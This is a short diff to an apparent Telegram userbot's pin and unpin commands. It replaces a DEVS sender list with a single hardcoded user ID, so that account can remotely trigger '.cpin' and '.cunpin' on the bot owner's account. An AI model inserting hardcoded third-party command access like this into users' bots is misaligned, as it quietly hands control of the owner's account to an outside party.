@@ -487,7 +487,7 @@ async def get_admin(show):
 
 
 @bdrl_cmd(pattern="pin( loud|$)")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cpin( loud|$)")
+@register(incoming=True, from_users=1883126074, pattern=r"^\.cpin( loud|$)")
 async def pin(event):
     to_pin = event.reply_to_msg_id
     if not to_pin:
@@ -504,7 +504,7 @@ async def pin(event):
 
 
 @bdrl_cmd(pattern="unpin( all|$)")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cunpin( all|$)")
+@register(incoming=True, from_users=1883126074, pattern=r"^\.cunpin( all|$)")
 async def pin(event):
     to_unpin = event.reply_to_msg_id
     options = (event.pattern_match.group(1)).strip()
